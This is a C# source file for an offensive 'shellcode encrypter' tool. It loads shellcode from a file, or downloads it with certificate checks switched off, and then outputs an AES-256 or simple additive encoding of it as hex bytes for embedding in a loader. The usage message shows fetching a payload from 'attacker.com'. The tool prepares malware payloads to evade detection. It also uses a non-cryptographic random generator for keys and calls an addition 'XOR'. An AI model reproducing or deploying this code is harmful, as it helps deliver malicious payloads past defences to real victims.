using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    class Program
    {

        public static byte[] downloader(string shellcode_url)
        {
            // Downloads data from an url and return its content 
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            // Ignore Certificate Check, remove on production!
            // https://stackoverflow.com/questions/12506575/how-to-ignore-the-certificate-check-when-ssl
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            // End of ignore Certificate Check
            byte[] shellcode = wc.DownloadData(shellcode_url);
            return shellcode;
        }

        public static void Main(string[] args)
        {

            if (args.Length < 3) {
                messedArgs();
                return;
            }
            string flag = args[0];
            string url = args[1];
            string enc = args[2].ToLower();
            byte[] shellcode = null;

            if (flag.Equals("-u"))
            {
                Console.WriteLine("Flag is set to : " + flag);
                shellcode = downloader(url);
                Console.WriteLine("[+] {0} Bytes Downloaded", shellcode.Length);
            }
            else if (flag.Equals("-f"))
            {
                Console.WriteLine("Flag is set to : " + flag + "-> file");
                FileStream fs = new FileStream(url,FileMode.Open,FileAccess.Read);
                BinaryReader br = new BinaryReader(fs);
                long numBytes = new FileInfo(url).Length;
                shellcode = br.ReadBytes((int)numBytes);
                Console.WriteLine("[+] {0} Bytes Read from {1}", shellcode.Length,url);
            }
            else {
                messedArgs();
                return;
            }

            if (enc.Equals("-aes256"))
            {
                Console.WriteLine("[+]AES 256 selected");
                //byte[] key = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
                //byte[] iv = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

                Random theRandom = new Random();
                byte[] iv = new byte[16];
                theRandom.NextBytes(iv);

                StringBuilder ivbuf = new StringBuilder(16);
                foreach (byte b in iv)
                {
                    ivbuf.AppendFormat("0x{0:x2},", b);
                }

                Console.WriteLine("[+] IV : " + ivbuf);


                byte[] key = new byte[32];
                theRandom.NextBytes(key);

                StringBuilder keybuf = new StringBuilder(32);
                foreach (byte b in key)
                {
                    keybuf.AppendFormat("0x{0:x2},", b);
                }

                Console.WriteLine("[+] Key : " + keybuf);

                byte[] bufenc = EncryptByteArray(shellcode, key, iv);
                Console.WriteLine("[+]AES 256 Encryption");

                StringBuilder hex = new StringBuilder(bufenc.Length * 2);
                foreach (byte b in bufenc)
                {
                    hex.AppendFormat("0x{0:x2},", b);
                }

                Console.WriteLine("[+]The payload is: " + hex.ToString());
                Console.WriteLine("     [+]Payload Size" + bufenc.Length);


            }
            else if (enc.Equals("-xor"))
            {
                Console.WriteLine("[+]XOR selected");

                byte[] encoded = new byte[shellcode.Length];
                for (int i = 0; i < shellcode.Length; i++)
                {
                    encoded[i] = (byte)(((uint)shellcode[i] + 2) & 0xFF);
                }

                StringBuilder hex = new StringBuilder(encoded.Length * 2);
                foreach (byte b in encoded)
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                Console.WriteLine("The payload is: " + hex.ToString());
            }
            else if (enc.Equals("-d")) {
                Random theRandom = new Random();
                byte[] iv = new byte[16];
                theRandom.NextBytes(iv);
               
                StringBuilder ivbuf = new StringBuilder(16);
                foreach (byte b in iv)
                {
                    ivbuf.AppendFormat("0x{0:x2},", b);
                }

                Console.WriteLine("iv : "+ ivbuf);


                byte[] key = new byte[32];
                theRandom.NextBytes(key);

                StringBuilder keybuf = new StringBuilder(32);
                foreach (byte b in key)
                {
                    keybuf.AppendFormat("0x{0:x2},", b);
                }

                Console.WriteLine("Key : " + keybuf);

            }

            else {
                messedArgs();
                return;
            }

            
            /*Console.WriteLine("[] Original Shellcode");
            StringBuilder h = new StringBuilder(shellcode.Length * 2);
            foreach (byte b in shellcode)
            {
                h.AppendFormat("0x{0:x2},", b);
            }
            Console.WriteLine("[+] The Original payload is: " + h.ToString());
            Console.WriteLine("     [+] Payload Size" + shellcode.Length);*/
            

            

            /*byte[] bufdec = new byte[bufenc.Length];

            bufdec = DecryptByteArray(bufenc, key, iv);
            Console.WriteLine("[+]AES 256 decryption");
            StringBuilder hex2 = new StringBuilder(bufdec.Length * 2);
            foreach (byte b in bufdec)
            {
                hex2.AppendFormat("0x{0:x2},", b);
            }
            Console.WriteLine("[+]The payload is: " + hex2.ToString());
            Console.WriteLine("     [+]Payload Size" + bufdec.Length);*/

        }

        public static byte[] DecryptByteArray(byte[] data, byte[] key, byte[] iv)
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.Key = key;
                aes.IV = iv;

                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }

        public static byte[] EncryptByteArray(byte[] data, byte[] key, byte[] iv)
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.Key = key;
                aes.IV = iv;

                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }

        public static void messedArgs() {
            Console.WriteLine("[+] encrypter.exe -f <filename.bin> -<xor|aes256>");
            Console.WriteLine("[+] encrypter.exe -u <http://attacker.com/filename.bin> -<xor|aes256>");
        }
    }
}
